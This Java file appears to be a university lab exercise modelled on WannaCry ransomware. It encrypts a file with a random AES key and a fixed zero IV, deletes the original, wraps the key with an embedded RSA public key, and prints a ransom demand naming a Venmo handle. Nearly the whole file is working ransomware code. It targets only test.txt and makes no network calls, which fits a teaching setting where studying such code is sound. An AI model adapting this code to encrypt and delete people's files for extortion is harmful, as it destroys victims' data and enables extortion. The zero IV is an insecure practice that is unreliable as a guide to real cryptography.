package le.ac.uk.WannaCry;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class WannaCry {
    public static void main(String[] args) throws Exception {
        KeyGenerator Key_Generator = KeyGenerator.getInstance("AES");
        Key_Generator.init(256, new SecureRandom());
        SecretKey keySecret = Key_Generator.generateKey();

        byte[] fileBytes = null;
        try (FileInputStream fis = new FileInputStream("test.txt")) {
            fileBytes = fis.readAllBytes();
        } catch (FileNotFoundException e) {
            System.out.println("File not found: " + e.getMessage());
        } catch (IOException e) {
            System.out.println("Error reading file: " + e.getMessage());
        }
        if (fileBytes == null) return;

        byte[] encryptedFileBytes = null;
        IvParameterSpec zeroPaddingIV = new IvParameterSpec(new byte[16]);
        Cipher AESCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        AESCipher.init(Cipher.ENCRYPT_MODE, keySecret, zeroPaddingIV);
        encryptedFileBytes = AESCipher.doFinal(fileBytes);

        try (FileOutputStream fos = new FileOutputStream("test.txt.cry")) {
            if (encryptedFileBytes != null) fos.write(encryptedFileBytes);
        } catch (IOException e) {
            System.out.println("Error writing encrypted file: " + e.getMessage());
            return;
        }

        try {
            Files.delete(Path.of("test.txt"));
        } catch (IOException e) {
            System.out.println("Error deleting file: " + e.getMessage());
            return;
        }

        String masterPublicKeyBase64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpPqoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXdtcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w16YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1eWi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";
        Base64.Decoder decoder = Base64.getDecoder(); // From Lab1.
        byte[] masterPublicKeyBytes = decoder.decode(masterPublicKeyBase64);
        X509EncodedKeySpec X509KeySpec = new X509EncodedKeySpec(masterPublicKeyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        PublicKey keyMasterPublic = keyFactory.generatePublic(X509KeySpec);

        Cipher RSACipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        RSACipher.init(Cipher.ENCRYPT_MODE, keyMasterPublic);
        byte[] keySecretEncodedBytes = RSACipher.doFinal(keySecret.getEncoded());

        try (FileOutputStream fos = new FileOutputStream("aes.key")) {
            fos.write(keySecretEncodedBytes);
        }

        String ransomMessage = """
                Dear Victim - Please note that your files have now stolen and encrypted!
                
                If you want them back, let a girl a know. My venmo is princessCatBurger28.
                """;
        System.out.println(ransomMessage);
    }
}
